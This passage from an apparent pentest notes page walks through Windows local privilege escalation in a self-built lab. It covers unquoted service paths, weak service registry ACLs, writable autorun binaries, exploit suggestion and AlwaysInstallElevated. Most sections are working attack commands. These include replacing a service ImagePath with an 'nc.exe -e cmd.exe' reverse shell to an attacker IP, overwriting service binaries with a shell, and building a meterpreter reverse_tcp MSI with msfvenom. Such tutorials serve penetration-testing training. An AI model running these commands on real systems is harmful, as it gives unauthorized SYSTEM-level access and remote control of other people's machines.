<figure><img src="../../.gitbook/assets/image (1934).png" alt=""><figcaption></figcaption></figure>
{% endtab %}

{% tab title="PowerShell" %}
{% code overflow="wrap" expandable="true" %}
```powershell
Get-CimInstance Win32_Service |
    Where-Object {
        $_.StartMode -eq "Auto" -and
        $_.PathName -notmatch '(?i)^"?C:\\Windows\\'
    } |
    Select-Object Name, DisplayName, PathName, StartMode
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1930).png" alt=""><figcaption></figcaption></figure>
{% endtab %}
{% endtabs %}

#### Check which service has system access&#x20;

{% code overflow="wrap" expandable="true" %}
```powershell
sc.exe qc DeviceTelemetryAgent
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1935).png" alt=""><figcaption></figcaption></figure>

#### Understand the candidate we're targeting&#x20;

For:

```
C:\Program Files\DeviceTelemetry\Telemetry Agent\DeviceHealthMonitor.exe
```

the ambiguous candidates include:

```
C:\Program.exe
C:\Program Files\DeviceTelemetry.exe
C:\Program Files\DeviceTelemetry\Telemetry.exe
C:\Program Files\DeviceTelemetry\Telemetry Agent\DeviceHealthMonitor.exe
```

{% hint style="info" %}
_**Write permission on any of the above paths can help us escalate privileges.**_
{% endhint %}

#### Check Which candidate is writable&#x20;

{% code overflow="wrap" expandable="true" %}
```powershell
accesschk.exe /accepteula -uwdq <directory>
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1936).png" alt=""><figcaption></figcaption></figure>

#### Escalate Privileges&#x20;

{% code overflow="wrap" expandable="true" %}
```cmd
cp C:\users\esc_priv_user\Desktop\shell.exe 'C:\Program Files\DeviceTelemetry\Telemetry.exe'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1937).png" alt=""><figcaption></figcaption></figure>

### Abusing Modifiable Registry (Weak Registry ACL)

Microsoft documents that a service's configuration is backed by `HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>`, and `ImagePath` identifies the service binary path.

<details>

<summary><strong>Understanding the vulnerability</strong> </summary>

Suppose we have:

```
HKLM
 └── SYSTEM
     └── CurrentControlSet
         └── Services
             └── MyService
                 ├── ImagePath
                 ├── Start
                 ├── Type
                 └── ObjectName
```

For example:

```
ImagePath = C:\Program Files\MyService\service.exe
ObjectName = LocalSystem
```

Normally:

```
Low-privileged user
        |
        X
        |   cannot modify service configuration
        v
Service
```

But suppose the registry ACL is:

```
HKLM\...\Services\MyService

BUILTIN\Administrators     Full Control
SYSTEM                     Full Control
Users                      Full Control   <-- vulnerability
```

Then:

```
Low-privileged user
        |
        | KEY_SET_VALUE / Full Control
        v
MyService registry key
        |
        | modify ImagePath
        v
malicious.exe
        |
        | service starts as LocalSystem
        v
NT AUTHORITY\SYSTEM
```

That is the entire vulnerability.

The crucial point is that **the service itself does not necessarily have to give us `SERVICE_CHANGE_CONFIG`**. We are changing the registry representation of its configuration instead. Microsoft separately documents `SERVICE_CHANGE_CONFIG` as the right required for changing configuration through the Service Control Manager.

</details>

<details>

<summary><strong>Create the vulnerable environment</strong></summary>

## Create the service&#x20;

{% code overflow="wrap" expandable="true" %}
```cmd
sc.exe create RegAclDemo `
    binPath= "C:\Windows\System32\cmd.exe /c exit 0" `
    start= demand `
    obj= LocalSystem
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1938).png" alt=""><figcaption></figcaption></figure>

## Inspect its registry representation&#x20;

{% code overflow="wrap" expandable="true" %}
```powershell
reg query HKLM\SYSTEM\CurrentControlSet\Services\RegAclDemo
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1939).png" alt=""><figcaption></figcaption></figure>

## Grant the low-privileged user registry write access&#x20;

{% code overflow="wrap" expandable="true" %}
```ps1
$path = "HKLM:\SYSTEM\CurrentControlSet\Services\RegAclDemo"

$rule = New-Object System.Security.AccessControl.RegistryAccessRule(
    "esc_priv_user",
    "FullControl",
    "Allow"
)

$acl = Get-Acl $path
$acl.AddAccessRule($rule)

Set-Acl -Path $path -AclObject $acl
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1940).png" alt=""><figcaption></figcaption></figure>

</details>

#### identify Vulnerable Registry key (Automation)

{% code overflow="wrap" expandable="true" %}
```powershell
# Find-WeakServiceRegistry.ps1
# Run from a low-privileged PowerShell session.

$ErrorActionPreference = "SilentlyContinue"

$root = "HKLM:\SYSTEM\CurrentControlSet\Services"
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

Write-Host ""
Write-Host "=============================================="
Write-Host " Weak Service Registry ACL Enumeration"
Write-Host "=============================================="
Write-Host ""
Write-Host "[+] Current user: $currentUser"
Write-Host ""

$services = Get-ChildItem $root

foreach ($service in $services) {

    try {
        $acl = Get-Acl $service.PSPath

        $hasWrite = $false
        $matchingRules = @()

        foreach ($rule in $acl.Access) {

            if ($rule.AccessControlType -ne "Allow") {
                continue
            }

            $identity = $rule.IdentityReference.Value

            try {
                $sid = $rule.IdentityReference.Translate(
                    [System.Security.Principal.SecurityIdentifier]
                )
            }
            catch {
                continue
            }

            $currentToken = [System.Security.Principal.WindowsIdentity]::GetCurrent()

            $principal = New-Object System.Security.Principal.WindowsPrincipal($currentToken)

            $matches = $false

            if ($identity -eq $currentUser) {
                $matches = $true
            }
            elseif ($identity -eq "Everyone") {
                $matches = $true
            }
            elseif ($identity -eq "BUILTIN\Users" -and
                    $principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::User)) {
                $matches = $true
            }
            elseif ($identity -eq "NT AUTHORITY\INTERACTIVE") {
                $matches = $true
            }

            if ($matches) {

                $writeRights =
                    ($rule.RegistryRights.ToString() -match "WriteKey|FullControl|CreateSubKey|SetValue")

                if ($writeRights) {

                    $hasWrite = $true
                    $matchingRules += $rule
                }
            }
        }

        if ($hasWrite) {

            $serviceName = $service.PSChildName

            $imagePath = $null
            $start = $null
            $objectName = $null

            try {
                $props = Get-ItemProperty $service.PSPath

                $imagePath = $props.ImagePath
                $start = $props.Start
                $objectName = $props.ObjectName
            }
            catch {}

            Write-Host "----------------------------------------------"
            Write-Host "[!] Potentially vulnerable service: $serviceName"
            Write-Host "    Registry : $($service.Name)"
            Write-Host "    ImagePath: $imagePath"
            Write-Host "    Start    : $start"
            Write-Host "    Object   : $objectName"
            Write-Host ""

            foreach ($rule in $matchingRules) {
                Write-Host "    ACL:"
                Write-Host "      $($rule.IdentityReference)"
                Write-Host "      $($rule.RegistryRights)"
            }

            Write-Host ""
        }
    }
    catch {}
}

Write-Host "=============================================="
Write-Host " Enumeration complete"
Write-Host "=============================================="
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1941).png" alt=""><figcaption></figcaption></figure>

#### Verify the vulnerability (Manual)

{% code overflow="wrap" expandable="true" %}
```powershell
accesschk.exe /accepteula "esc_priv_user" -kvuqsw hklm\System\CurrentControlSet\services
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1942).png" alt=""><figcaption></figcaption></figure>

#### Identify the Start type and Binary&#x20;

{% code overflow="wrap" expandable="true" %}
```powershell
sc.exe qc RegAclDemo
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1943).png" alt=""><figcaption></figcaption></figure>

#### Change ImagePath with PowerShell and escalating Privileges&#x20;

{% code overflow="wrap" expandable="true" %}
```powershell
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\ModelManagerService -Name "ImagePath" -Value "C:\Users\john\Downloads\nc.exe -e cmd.exe 10.10.10.205 443"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1944).png" alt=""><figcaption></figcaption></figure>

### Weak Registry AutoRun&#x20;

<details>

<summary><strong>Create the vulnerable environment</strong></summary>

## Create the Directory&#x20;

{% code overflow="wrap" expandable="true" %}
```powershell
New-Item -ItemType Directory `
    -Path "C:\Program Files\StartupLab" `
    -Force
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1945).png" alt=""><figcaption></figcaption></figure>

## Create legitimate test executable&#x20;

{% code overflow="wrap" expandable="true" %}
```powershell
$source = @'
using System;
using System.IO;
using System.Security.Principal;

class Program
{
    static void Main()
    {
        File.WriteAllText(
            @"C:\ProgramData\StartupLab.txt",
            "LEGITIMATE: " +
            WindowsIdentity.GetCurrent().Name
        );
    }
}
'@

Add-Type `
    -TypeDefinition $source `
    -OutputAssembly "C:\Program Files\StartupLab\StartupDemo.exe" `
    -OutputType ConsoleApplication
```
{% endcode %}

## Create the startup entry&#x20;

{% code overflow="wrap" expandable="true" %}
```powershell
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" ^
 /v StartupLab ^
 /t REG_SZ ^
 /d "\"C:\Program Files\StartupLab\StartupDemo.exe\"" ^
 /f
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1947).png" alt=""><figcaption></figcaption></figure>

## Give Low-privileged user write access to the binary&#x20;

{% code overflow="wrap" expandable="true" %}
```powershell
icacls "C:\Program Files\StartupLab\StartupDemo.exe" ^
 /grant "esc_priv_user":M
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1948).png" alt=""><figcaption></figcaption></figure>

</details>

#### Enumerate Startup Programs&#x20;

{% code overflow="wrap" expandable="true" %}
```powershell
Get-CimInstance Win32_StartupCommand |
    Select-Object Name, Command, Location, User, UserSID |
    Format-List
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1949).png" alt=""><figcaption></figcaption></figure>

#### Identify writable startup&#x20;

{% code overflow="wrap" expandable="true" %}
```powershell
icacls "C:\Program Files\StartupLab\StartupDemo.exe"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1951).png" alt=""><figcaption></figcaption></figure>

#### Copy the malicious file&#x20;

{% code overflow="wrap" expandable="true" %}
```powershell
Copy-Item <source shell> <destination executable>
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1950).png" alt=""><figcaption></figcaption></figure>

## Kernel Exploit&#x20;

### Identifying Vulnerabilities Using Windows Exploit Suggester

#### Export systeminfo to a file&#x20;

{% code overflow="wrap" expandable="true" %}
```
systeminfo > systeminfo.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1952).png" alt=""><figcaption></figcaption></figure>

#### Feeding in Windows Exploit Suggester&#x20;

{% code overflow="wrap" expandable="true" %}
```bash
python3 wes.py systeminfo.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1953).png" alt=""><figcaption></figcaption></figure>

### Exploiting vulnerability&#x20;

1. **Identifying the most possible exploits through AI 😅. (Just for speedup)**&#x20;

<figure><img src="../../.gitbook/assets/image (1954).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1955).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1956).png" alt=""><figcaption></figcaption></figure>

## Abusing Registry AlwaysInstallElevated

### Understanding AlwaysInstallElevated

`AlwaysInstallElevated` is a **Windows Installer policy misconfiguration** that can lead to **local privilege escalation**. Normally, installing software that requires elevated privileges should require an administrator/UAC approval. With this misconfiguration, Windows is explicitly configured to allow certain MSI installations to run elevated.

<details>

<summary><strong>Create the vulnerable environment</strong></summary>

## Enable AlwaysInstallElevated

### Set AlwaysInstallElevated Across Computer

{% code overflow="wrap" expandable="true" %}
```cmd
reg add HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1963).png" alt=""><figcaption></figcaption></figure>

### **Set AlwaysInstallElevated for Specific User (Required):**

{% code overflow="wrap" expandable="true" %}
```cmd
reg add "HKEY_USERS\S-1-5-21-3961120578-3141309858-2889632052-1002\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated /t REG_DWORD /d 1 /f
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1971).png" alt=""><figcaption></figcaption></figure>

### **Enable Policy**

Navigate to `Local Security Policy > Computer Configuration > Administrative Templates > Windows Components > Windows Installer > Always Install with elevated Privileges`

<figure><img src="../../.gitbook/assets/image (1969).png" alt=""><figcaption></figcaption></figure>

</details>

### Exploiting Registry AlwaysInstallElevated

#### Enumerate and Confirm the vulnerability&#x20;

{% code overflow="wrap" expandable="true" %}
```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1964).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" expandable="true" %}
```
reg query "HKCU\Software\Policies\Microsoft\Windows\Installer" /v AlwaysInstallElevated
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1972).png" alt=""><figcaption></figcaption></figure>

#### Create Payload and Deliver&#x20;

{% code overflow="wrap" expandable="true" %}
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.10.10.128 lport=8888 -f msi -o setup.msi
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (1968).png" alt=""><figcaption></figcaption></figure>

#### Exploit

<figure><img src="../../.gitbook/assets/image (1966).png" alt=""><figcaption></figcaption></figure>

## Automated Tools&#x20;

These tools are listed in descending order based on their frequency of use and the quality of results observed in our local lab.

<table><thead><tr><th width="101.20001220703125">No.</th><th width="337.20001220703125">Tool</th></tr></thead><tbody><tr><td><ol><li></li></ol></td><td><a href="https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS">WinPEAS</a></td></tr><tr><td><ol start="2"><li></li></ol></td><td><a href="https://github.com/harmj0y/powerup">PowerUp</a> / <a href="https://github.com/ghostpack/sharpup">SharpUp.exe</a></td></tr><tr><td><ol start="3"><li></li></ol></td><td><a href="https://github.com/itm4n/PrivescCheck">PrivescCheck</a></td></tr><tr><td><ol start="4"><li></li></ol></td><td><a href="https://github.com/rasta-mouse/Watson.git">Watson.exe</a></td></tr><tr><td><ol start="5"><li></li></ol></td><td><a href="https://github.com/411Hall/JAWS">JAWS</a></td></tr><tr><td><ol start="6"><li></li></ol></td><td><a href="https://github.com/bitsadmin/wesng">Windows Exploit Suggester</a></td></tr></tbody></table>

